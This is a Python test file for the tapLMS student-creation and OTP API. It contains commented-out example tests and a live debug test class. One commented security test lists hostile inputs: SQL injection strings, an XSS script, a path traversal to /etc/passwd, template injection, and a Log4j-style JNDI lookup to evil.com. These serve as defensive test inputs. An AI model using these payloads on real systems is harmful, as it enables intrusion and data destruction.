# """
# Improved test examples for tapLMS API
# These examples show how to enhance your current test structure
# """

# import unittest
# from unittest.mock import Mock, patch, MagicMock
# import pytest
# import json
# from datetime import datetime, timedelta
# import sys

# # Your existing mock setup (simplified)
# class MockFrappe:
#     def __init__(self):
#         self.response = Mock()
#         self.response.http_status_code = 200
#         self.local = Mock()
#         self.local.form_dict = {}
#         self.db = Mock()
#         self.utils = Mock()
#         self.request = Mock()
        
#     # ... rest of your mock setup

# mock_frappe = MockFrappe()
# sys.modules['frappe'] = mock_frappe

# # Import your API after setting up mocks
# from tap_lms.api import create_student, authenticate_api_key, send_otp

# # =============================================================================
# # IMPROVED TEST EXAMPLES
# # =============================================================================

# class TestStudentCreationComprehensive(unittest.TestCase):
#     """Comprehensive tests for student creation - improved version"""
    
#     def setUp(self):
#         """Set up test fixtures with realistic data"""
#         self.valid_student_data = {
#             'api_key': 'valid_test_key',
#             'student_name': 'John Doe',
#             'phone': '9876543210',
#             'gender': 'Male',
#             'grade': '5',
#             'language': 'English',
#             'batch_skeyword': 'test_batch_2025',
#             'vertical': 'Mathematics',
#             'glific_id': 'glific_12345'
#         }
        
#         # Reset form_dict for each test
#         mock_frappe.local.form_dict = self.valid_student_data.copy()
#         mock_frappe.response.http_status_code = 200

#     @patch('tap_lms.api.authenticate_api_key')
#     @patch('tap_lms.api.get_course_level_with_mapping')
#     @patch.object(mock_frappe, 'get_all')
#     @patch.object(mock_frappe, 'get_doc')
#     def test_create_student_success_flow(self, mock_get_doc, mock_get_all, 
#                                        mock_course_level, mock_auth):
#         """Test successful student creation with all dependencies"""
#         # Setup mocks
#         mock_auth.return_value = "valid_key"
        
#         # Mock batch onboarding data
#         mock_get_all.side_effect = [
#             # First call: batch onboarding
#             [{
#                 'school': 'SCHOOL_001',
#                 'batch': 'BATCH_001',
#                 'kit_less': 1
#             }],
#             # Second call: course vertical
#             [{'name': 'VERTICAL_001'}],
#             # Third call: existing student check
#             []  # No existing student
#         ]
        
#         # Mock batch document
#         mock_batch = Mock()
#         mock_batch.active = True
#         mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
        
#         # Mock student document
#         mock_student = Mock()
#         mock_student.name = 'STUDENT_001'
#         mock_student.append = Mock()
#         mock_student.save = Mock()
        
#         mock_get_doc.side_effect = [mock_batch, mock_student]
#         mock_course_level.return_value = 'COURSE_LEVEL_001'
        
#         # Execute test
#         result = create_student()
        
#         # Assertions
#         self.assertEqual(result['status'], 'success')
#         self.assertEqual(result['crm_student_id'], 'STUDENT_001')
#         self.assertEqual(result['assigned_course_level'], 'COURSE_LEVEL_001')
        
#         # Verify enrollment was added
#         mock_student.append.assert_called_once()
#         mock_student.save.assert_called_once()

#     @pytest.mark.parametrize("missing_field", [
#         'student_name', 'phone', 'gender', 'grade', 
#         'language', 'batch_skeyword', 'vertical', 'glific_id'
#     ])
#     def test_create_student_missing_required_fields(self, missing_field):
#         """Test student creation with each required field missing"""
#         # Remove one required field
#         test_data = self.valid_student_data.copy()
#         del test_data[missing_field]
#         mock_frappe.local.form_dict = test_data
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#             result = create_student()
            
#             self.assertEqual(result['status'], 'error')
#             self.assertIn('required', result['message'].lower())

#     @pytest.mark.parametrize("invalid_phone", [
#         "123",           # Too short
#         "abcdefghij",    # Non-numeric
#         "",              # Empty
#         "1" * 20,        # Too long
#         "+91-abc-def",   # Mixed invalid format
#     ])
#     def test_create_student_invalid_phone_formats(self, invalid_phone):
#         """Test student creation with various invalid phone formats"""
#         test_data = self.valid_student_data.copy()
#         test_data['phone'] = invalid_phone
#         mock_frappe.local.form_dict = test_data
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#             result = create_student()
            
#             # Should either validate and reject, or handle gracefully
#             # This depends on your validation logic
#             self.assertIn(result['status'], ['error', 'success'])

#     def test_create_student_expired_batch(self):
#         """Test student creation for expired batch"""
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
#              patch.object(mock_frappe, 'get_all') as mock_get_all, \
#              patch.object(mock_frappe, 'get_doc') as mock_get_doc:
            
#             # Mock expired batch
#             mock_get_all.return_value = [{
#                 'school': 'SCHOOL_001',
#                 'batch': 'BATCH_001',
#                 'kit_less': 1
#             }]
            
#             mock_batch = Mock()
#             mock_batch.active = True
#             mock_batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
#             mock_get_doc.return_value = mock_batch
            
#             result = create_student()
            
#             self.assertEqual(result['status'], 'error')
#             self.assertIn('ended', result['message'])

#     def test_create_student_database_error_rollback(self):
#         """Test database rollback on student creation error"""
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
#              patch.object(mock_frappe, 'get_all') as mock_get_all, \
#              patch.object(mock_frappe, 'get_doc') as mock_get_doc, \
#              patch.object(mock_frappe.db, 'rollback') as mock_rollback:
            
#             # Setup mocks for successful validation but database error
#             mock_get_all.side_effect = [
#                 [{'school': 'SCHOOL_001', 'batch': 'BATCH_001', 'kit_less': 1}],
#                 [{'name': 'VERTICAL_001'}],
#                 []  # No existing student
#             ]
            
#             mock_batch = Mock()
#             mock_batch.active = True
#             mock_batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
            
#             mock_student = Mock()
#             mock_student.save.side_effect = Exception("Database error")
            
#             mock_get_doc.side_effect = [mock_batch, mock_student]
            
#             result = create_student()
            
#             # Should handle error and rollback
#             self.assertEqual(result['status'], 'error')
#             # Verify rollback was called (depends on your error handling)


# class TestOTPWorkflowComprehensive(unittest.TestCase):
#     """Comprehensive OTP workflow tests"""
    
#     def setUp(self):
#         mock_frappe.request.get_json.return_value = {
#             'api_key': 'valid_key',
#             'phone': '9876543210'
#         }

#     @patch('tap_lms.api.authenticate_api_key')
#     @patch('requests.get')
#     @patch.object(mock_frappe, 'get_all')
#     @patch.object(mock_frappe, 'get_doc')
#     def test_send_otp_complete_workflow(self, mock_get_doc, mock_get_all, 
#                                       mock_requests, mock_auth):
#         """Test complete OTP sending workflow"""
#         # Setup mocks
#         mock_auth.return_value = "valid_key"
#         mock_get_all.return_value = []  # No existing teacher
        
#         # Mock OTP document creation
#         mock_otp_doc = Mock()
#         mock_otp_doc.insert = Mock()
#         mock_get_doc.return_value = mock_otp_doc
        
#         # Mock WhatsApp API response
#         mock_response = Mock()
#         mock_response.json.return_value = {
#             "status": "success",
#             "id": "msg_12345"
#         }
#         mock_requests.return_value = mock_response
        
#         result = send_otp()
        
#         # Assertions
#         self.assertEqual(result['status'], 'success')
#         self.assertIn('whatsapp_message_id', result)
#         mock_otp_doc.insert.assert_called_once()

#     @patch('tap_lms.api.authenticate_api_key')
#     @patch('requests.get')
#     def test_send_otp_whatsapp_api_failure(self, mock_requests, mock_auth):
#         """Test OTP sending when WhatsApp API fails"""
#         mock_auth.return_value = "valid_key"
        
#         # Mock API failure
#         mock_response = Mock()
#         mock_response.json.return_value = {
#             "status": "error",
#             "message": "API rate limit exceeded"
#         }
#         mock_requests.return_value = mock_response
        
#         with patch.object(mock_frappe, 'get_all', return_value=[]), \
#              patch.object(mock_frappe, 'get_doc'):
            
#             result = send_otp()
            
#             self.assertEqual(result['status'], 'failure')
#             self.assertIn('WhatsApp', result['message'])

#     def test_send_otp_rate_limiting(self):
#         """Test OTP rate limiting (if implemented)"""
#         # This would test your rate limiting logic
#         # Multiple rapid requests should be rejected
#         pass


# class TestSecurityValidation(unittest.TestCase):
#     """Security-focused validation tests"""
    
#     @pytest.mark.parametrize("malicious_input", [
#         "'; DROP TABLE Student; --",
#         "1' OR '1'='1",
#         "<script>alert('xss')</script>",
#         "../../etc/passwd",
#         "{{7*7}}",  # Template injection
#         "${jndi:ldap://evil.com/a}",  # Log4j style
#     ])
#     def test_sql_injection_prevention(self, malicious_input):
#         """Test SQL injection prevention in various fields"""
#         test_data = {
#             'api_key': 'valid_key',
#             'student_name': malicious_input,  # Test malicious input
#             'phone': '9876543210',
#             'gender': 'Male',
#             'grade': '5',
#             'language': 'English',
#             'batch_skeyword': 'test_batch',
#             'vertical': 'Math',
#             'glific_id': 'glific_123'
#         }
        
#         mock_frappe.local.form_dict = test_data
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#             # The function should either sanitize input or reject it
#             result = create_student()
            
#             # Should not cause SQL injection
#             # This assertion depends on your input validation
#             self.assertIn(result['status'], ['error', 'success'])
            
#             # If successful, verify data was sanitized
#             if result['status'] == 'success':
#                 # Check that malicious input was properly handled
#                 pass

#     def test_api_key_timing_attack_prevention(self):
#         """Test that API key validation doesn't leak timing information"""
#         import time
        
#         # Test with valid and invalid keys
#         start_time = time.time()
#         authenticate_api_key("valid_key_12345")
#         valid_time = time.time() - start_time
        
#         start_time = time.time()
#         authenticate_api_key("invalid_key_12345")
#         invalid_time = time.time() - start_time
        
#         # Times should be similar (within reasonable bounds)
#         # This prevents timing attacks
#         time_diff = abs(valid_time - invalid_time)
#         self.assertLess(time_diff, 0.1)  # Less than 100ms difference


# class TestPerformance(unittest.TestCase):
#     """Performance tests for critical operations"""
    
#     def test_bulk_student_creation_performance(self):
#         """Test performance with bulk student creation"""
#         import time
        
#         # Create 100 students and measure time
#         start_time = time.time()
        
#         for i in range(100):
#             test_data = {
#                 'api_key': 'valid_key',
#                 'student_name': f'Student {i}',
#                 'phone': f'987654{i:04d}',
#                 'gender': 'Male',
#                 'grade': '5',
#                 'language': 'English',
#                 'batch_skeyword': 'test_batch',
#                 'vertical': 'Math',
#                 'glific_id': f'glific_{i}'
#             }
            
#             mock_frappe.local.form_dict = test_data
            
#             with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"):
#                 # Mock all dependencies for speed
#                 with patch.object(mock_frappe, 'get_all'), \
#                      patch.object(mock_frappe, 'get_doc'):
#                     result = create_student()
        
#         end_time = time.time()
#         total_time = end_time - start_time
        
#         # Should complete 100 operations in reasonable time
#         self.assertLess(total_time, 10.0)  # Less than 10 seconds
        
#         avg_time_per_operation = total_time / 100
#         self.assertLess(avg_time_per_operation, 0.1)  # Less than 100ms per operation


# # =============================================================================
# # PYTEST FIXTURES FOR BETTER TEST ORGANIZATION
# # =============================================================================

# @pytest.fixture
# def valid_student_data():
#     """Fixture providing valid student data"""
#     return {
#         'api_key': 'valid_test_key',
#         'student_name': 'John Doe',
#         'phone': '9876543210',
#         'gender': 'Male',
#         'grade': '5',
#         'language': 'English',
#         'batch_skeyword': 'test_batch_2025',
#         'vertical': 'Mathematics',
#         'glific_id': 'glific_12345'
#     }

# @pytest.fixture
# def mock_active_batch():
#     """Fixture providing mock active batch"""
#     batch = Mock()
#     batch.active = True
#     batch.regist_end_date = (datetime.now() + timedelta(days=30)).date()
#     return batch

# @pytest.fixture
# def mock_expired_batch():
#     """Fixture providing mock expired batch"""
#     batch = Mock()
#     batch.active = True
#     batch.regist_end_date = (datetime.now() - timedelta(days=1)).date()
#     return batch


# # =============================================================================
# # INTEGRATION TEST EXAMPLE
# # =============================================================================

# class TestStudentCreationIntegration(unittest.TestCase):
#     """Integration tests that test multiple components together"""
    
#     def test_complete_student_onboarding_workflow(self):
#         """Test complete workflow from OTP to student creation"""
#         # This would test the entire flow:
#         # 1. Send OTP
#         # 2. Verify OTP
#         # 3. Create student
#         # 4. Assign to batch
#         # 5. Integrate with Glific
        
#         with patch('tap_lms.api.authenticate_api_key', return_value="valid_key"), \
#              patch('requests.get') as mock_whatsapp, \
#              patch('tap_lms.glific_integration.create_contact') as mock_glific:
            
#             # Mock external service responses
#             mock_whatsapp.return_value.json.return_value = {
#                 "status": "success", "id": "msg_123"
#             }
#             mock_glific.return_value = {'id': 'contact_123'}
            
#             # Step 1: Send OTP
#             mock_frappe.request.get_json.return_value = {
#                 'api_key': 'valid_key',
#                 'phone': '9876543210'
#             }
            
#             otp_result = send_otp()
#             self.assertEqual(otp_result['status'], 'success')
            
#             # Step 2: Create student (after OTP verification)
#             student_data = {
#                 'api_key': 'valid_key',
#                 'student_name': 'John Doe',
#                 'phone': '9876543210',
#                 'gender': 'Male',
#                 'grade': '5',
#                 'language': 'English',
#                 'batch_skeyword': 'test_batch',
#                 'vertical': 'Math',
#                 'glific_id': 'glific_123'
#             }
#             mock_frappe.local.form_dict = student_data
            
#             with patch.object(mock_frappe, 'get_all'), \
#                  patch.object(mock_frappe, 'get_doc'):
#                 student_result = create_student()
                
#                 self.assertEqual(student_result['status'], 'success')
                
#                 # Verify external integrations were called
#                 mock_glific.assert_called()


# if __name__ == '__main__':
#     # Run tests with pytest for better output
#     pytest.main([__file__, '-v', '--tb=short'])



import frappe
import unittest
import json
from datetime import datetime, timedelta
from unittest.mock import patch, Mock
import traceback

class TestTapLMSAPIDebug(unittest.TestCase):
    """Debug version of tap_lms API tests with extensive logging"""
    
    @classmethod
    def setUpClass(cls):
        """Set up test data once for all tests"""
        print("\n" + "="*50)
        print("SETTING UP TEST CLASS")
        print("="*50)
        
        frappe.set_user("Administrator")
        frappe.flags.ignore_permissions = True
        
        # Create test API key
        cls.api_key_name = "test_api_key_12345"
        print(f"Creating API key: {cls.api_key_name}")
        
        if not frappe.db.exists("API Key", cls.api_key_name):
            try:
                api_key = frappe.get_doc({
                    "doctype": "API Key",
                    "key": cls.api_key_name,
                    "enabled": 1
                })
                api_key.insert()
                frappe.db.commit()
                print(f"✓ API key created successfully")
            except Exception as e:
                print(f"✗ Error creating API key: {e}")
                traceback.print_exc()
        else:
            print(f"✓ API key already exists")
        
        # Create test school
        cls.school_name = "TEST_SCHOOL_001"
        print(f"Creating school: {cls.school_name}")
        
        if not frappe.db.exists("School", cls.school_name):
            try:
                school = frappe.get_doc({
                    "doctype": "School",
                    "name": cls.school_name,
                    "name1": "Test School",
                    "keyword": "test_school"
                })
                school.insert()
                frappe.db.commit()
                print(f"✓ School created successfully")
            except Exception as e:
                print(f"✗ Error creating school: {e}")
                # Try with minimal fields
                try:
                    school = frappe.get_doc({
                        "doctype": "School",
                        "name": cls.school_name,
                        "school_name": "Test School"  # Try different field name
                    })
                    school.insert()
                    frappe.db.commit()
                    print(f"✓ School created with alternate fields")
                except Exception as e2:
                    print(f"✗ Failed with alternate fields too: {e2}")
        
        # Check available doctypes
        print("\nChecking available doctypes...")
        try:
            # List some key doctypes we need
            key_doctypes = ["API Key", "School", "Batch", "Student", "Course Verticals", "Batch onboarding"]
            for dt in key_doctypes:
                exists = frappe.db.exists("DocType", dt)
                print(f"  {dt}: {'✓' if exists else '✗'}")
        except Exception as e:
            print(f"Error checking doctypes: {e}")
    
    def setUp(self):
        """Set up for each individual test"""
        frappe.set_user("Administrator")
        frappe.flags.ignore_permissions = True
        
        # Clear form_dict for each test
        if hasattr(frappe.local, 'form_dict'):
            frappe.local.form_dict.clear()
        else:
            frappe.local.form_dict = {}
    
    def debug_api_response(self, func_name, form_data, result):
        """Helper to debug API responses"""
        print(f"\n--- DEBUG: {func_name} ---")
        print(f"Input data: {json.dumps(form_data, indent=2, default=str)}")
        print(f"Result: {json.dumps(result, indent=2, default=str)}")
        print(f"Result type: {type(result)}")
        
        if isinstance(result, dict) and result.get('status') == 'error':
            print(f"ERROR MESSAGE: {result.get('message', 'No message')}")
        
        print("-" * 30)
    
    def test_api_module_import(self):
        """Test if we can import the API module"""
        print("\n--- Testing API Module Import ---")
        try:
            from tap_lms.api import authenticate_api_key, create_student
            print("✓ Successfully imported API functions")
            
            # Check if functions are properly decorated
            print(f"authenticate_api_key whitelisted: {hasattr(authenticate_api_key, '_whitelisted')}")
            print(f"create_student whitelisted: {hasattr(create_student, '_whitelisted')}")
            
        except ImportError as e:
            print(f"✗ Import error: {e}")
            self.fail(f"Cannot import API module: {e}")
        except Exception as e:
            print(f"✗ Other error: {e}")
            self.fail(f"Error importing API: {e}")
    
    def test_authenticate_api_key_valid_debug(self):
        """Test API key authentication with debugging"""
        print("\n--- Testing Valid API Key ---")
        
        try:
            from tap_lms.api import authenticate_api_key
            
            # Check if API key exists in database
            api_key_doc = frappe.db.get_value("API Key", 
                                            {"key": self.api_key_name}, 
                                            ["name", "enabled"], as_dict=True)
            print(f"API key in DB: {api_key_doc}")
            
            result = authenticate_api_key(self.api_key_name)
            print(f"authenticate_api_key result: {result}")
            print(f"Result type: {type(result)}")
            
            self.assertIsNotNone(result, "Valid API key should return a result")
            
        except Exception as e:
            print(f"✗ Error in test: {e}")
            traceback.print_exc()
            self.fail(f"Test failed with error: {e}")
    
    def test_create_student_missing_api_key_debug(self):
        """Test student creation without API key with debugging"""
        print("\n--- Testing Missing API Key ---")
        
        try:
            from tap_lms.api import create_student
            
            form_data = {
                'student_name': 'John Doe',
                'phone': '9876543211',
                'gender': 'Male',
                'grade': '5'
            }
            
            frappe.local.form_dict = form_data
            result = create_student()
            
            self.debug_api_response("create_student (missing API key)", form_data, result)
            
            # Check the actual result structure
            if not isinstance(result, dict):
                self.fail(f"Expected dict result, got {type(result)}: {result}")
            
            if 'status' not in result:
                self.fail(f"Result missing 'status' field. Got: {result}")
            
            self.assertEqual(result['status'], 'error', 
                           f"Expected error status, got: {result}")
            
            # Check for API key mention in message
            message = result.get('message', '').lower()
            self.assertTrue(any(word in message for word in ['api', 'key', 'required']),
                          f"Error message should mention API key. Got: {result.get('message')}")
            
        except Exception as e:
            print(f"✗ Error in test: {e}")
            traceback.print_exc()
            self.fail(f"Test failed with error: {e}")
    
    def test_create_student_success_debug(self):
        """Test successful student creation with debugging"""
        print("\n--- Testing Successful Student Creation ---")
        
        try:
            from tap_lms.api import create_student
            
            # Set up comprehensive form data
            form_data = {
                'api_key': self.api_key_name,
                'student_name': 'John Doe Test Debug',
                'phone': '9876543299',  # Unique phone for this test
                'gender': 'Male',
                'grade': '5',
                'language': 'English',
                'batch_skeyword': 'test_batch_2025',
                'vertical': 'Mathematics',
                'glific_id': 'glific_debug_123'
            }
            
            frappe.local.form_dict = form_data
            
            # Mock external dependencies
            with patch('tap_lms.glific_integration.create_contact') as mock_glific, \
                 patch('requests.post') as mock_requests:
                
                mock_glific.return_value = {'id': 'contact_123'}
                mock_requests.return_value.status_code = 200
                mock_requests.return_value.json.return_value = {'success': True}
                
                print("Mocks set up, calling create_student...")
                result = create_student()
                
                self.debug_api_response("create_student (success case)", form_data, result)
                
                # Detailed result analysis
                if not isinstance(result, dict):
                    self.fail(f"Expected dict result, got {type(result)}: {result}")
                
                if 'status' not in result:
                    available_keys = list(result.keys()) if isinstance(result, dict) else "Not a dict"
                    self.fail(f"Result missing 'status' field. Available keys: {available_keys}")
                
                if result['status'] == 'error':
                    print(f"Got error when expecting success: {result}")
                    # Let's debug what went wrong
                    
                    # Check if batch exists
                    batch_check = frappe.db.get_value("Batch onboarding", 
                                                    {"batch_skeyword": "test_batch_2025"}, 
                                                    "name")
                    print(f"Batch onboarding exists: {batch_check}")
                    
                    if not batch_check:
                        print("Creating batch onboarding for test...")
                        self._create_test_batch_data()
                        
                        # Try again
                        result = create_student()
                        self.debug_api_response("create_student (retry after batch creation)", form_data, result)
                
                self.assertEqual(result['status'], 'success', 
                               f"Expected success, got: {result}")
                
                if result['status'] == 'success':
                    self.assertIn('crm_student_id', result, 
                                f"Success result should have crm_student_id: {result}")
                
        except Exception as e:
            print(f"✗ Error in test: {e}")
            traceback.print_exc()
            self.fail(f"Test failed with error: {e}")
    
    def _create_test_batch_data(self):
        """Helper to create all required test data"""
        print("Creating comprehensive test data...")
        
        try:
            # Create course vertical
            vertical_name = "TEST_VERTICAL_MATH"
            if not frappe.db.exists("Course Verticals", vertical_name):
                vertical = frappe.get_doc({
                    "doctype": "Course Verticals",
                    "name": vertical_name,
                    "vertical_name": "Mathematics"  # Try different field names
                })
                try:
                    vertical.insert()
                    frappe.db.commit()
                    print(f"✓ Course vertical created: {vertical_name}")
                except Exception as e:
                    print(f"✗ Error creating course vertical: {e}")
            
            # Create batch
            batch_name = "TEST_BATCH_001"
            if not frappe.db.exists("Batch", batch_name):
                batch = frappe.get_doc({
                    "doctype": "Batch",
                    "name": batch_name,
                    "batch_id": "test_batch_2025",
                    "active": 1,
                    "start_date": frappe.utils.today(),
                    "end_date": frappe.utils.add_days(frappe.utils.today(), 365),
                    "regist_end_date": frappe.utils.add_days(frappe.utils.today(), 30)
                })
                try:
                    batch.insert()
                    frappe.db.commit()
                    print(f"✓ Batch created: {batch_name}")
                except Exception as e:
                    print(f"✗ Error creating batch: {e}")
            
            # Create batch onboarding
            if not frappe.db.exists("Batch onboarding", {"batch_skeyword": "test_batch_2025"}):
                onboarding = frappe.get_doc({
                    "doctype": "Batch onboarding",
                    "school": self.school_name,
                    "batch": batch_name,
                    "batch_skeyword": "test_batch_2025",
                    "kit_less": 1,
                    "from_grade": "1",
                    "to_grade": "10"
                })
                try:
                    if frappe.db.exists("Course Verticals", vertical_name):
                        onboarding.append("batch_school_verticals", {
                            "course_vertical": vertical_name
                        })
                    onboarding.insert()
                    frappe.db.commit()
                    print(f"✓ Batch onboarding created")
                except Exception as e:
                    print(f"✗ Error creating batch onboarding: {e}")
                    
        except Exception as e:
            print(f"✗ Error in _create_test_batch_data: {e}")
            traceback.print_exc()
    
    def test_inspect_actual_api_behavior(self):
        """Inspect what the API actually does vs what we expect"""
        print("\n--- Inspecting Actual API Behavior ---")
        
        try:
            from tap_lms import api
            import inspect
            
            # Get all functions in the API module
            api_functions = inspect.getmembers(api, inspect.isfunction)
            print(f"Available API functions: {[name for name, func in api_functions]}")
            
            # Check if our expected functions exist
            expected_functions = ['authenticate_api_key', 'create_student', 'list_districts']
            for func_name in expected_functions:
                if hasattr(api, func_name):
                    func = getattr(api, func_name)
                    sig = inspect.signature(func)
                    print(f"✓ {func_name}: {sig}")
                else:
                    print(f"✗ {func_name}: Not found")
            
            # Try to understand the create_student function
            if hasattr(api, 'create_student'):
                print("\nAnalyzing create_student function...")
                source_lines = inspect.getsource(api.create_student).split('\n')[:10]
                print("First 10 lines:")
                for i, line in enumerate(source_lines):
                    print(f"  {i+1}: {line}")
            
        except Exception as e:
            print(f"Error inspecting API: {e}")
            traceback.print_exc()
    
    def test_database_state_debug(self):
        """Debug the database state"""
        print("\n--- Database State Debug ---")
        
        try:
            # Check what doctypes actually exist
            print("Checking DocType existence...")
            doctypes_to_check = [
                "API Key", "School", "Batch", "Student", 
                "Course Verticals", "Batch onboarding"
            ]
            
            for dt in doctypes_to_check:
                exists = frappe.db.exists("DocType", dt)
                if exists:
                    # Count records
                    count = frappe.db.count(dt)
                    print(f"  ✓ {dt}: {count} records")
                    
                    # Show sample record structure
                    if count > 0:
                        sample = frappe.db.get_all(dt, limit=1, fields=["name"])
                        if sample:
                            first_doc = frappe.get_doc(dt, sample[0].name)
                            meta = frappe.get_meta(dt)
                            fields = [f.fieldname for f in meta.fields[:5]]  # First 5 fields
                            print(f"    Sample fields: {fields}")
                else:
                    print(f"  ✗ {dt}: Does not exist")
            
            # Check our test data specifically
            print(f"\nChecking our test API key: {self.api_key_name}")
            api_key_exists = frappe.db.exists("API Key", {"key": self.api_key_name})
            print(f"  API key exists: {api_key_exists}")
            
            if api_key_exists:
                api_key_data = frappe.db.get_value("API Key", 
                                                 {"key": self.api_key_name}, 
                                                 ["name", "enabled", "key"], 
                                                 as_dict=True)
                print(f"  API key data: {api_key_data}")
            
        except Exception as e:
            print(f"Error checking database state: {e}")
            traceback.print_exc()


if __name__ == '__main__':
    # Run with extra verbosity
    unittest.main(verbosity=2, buffer=False)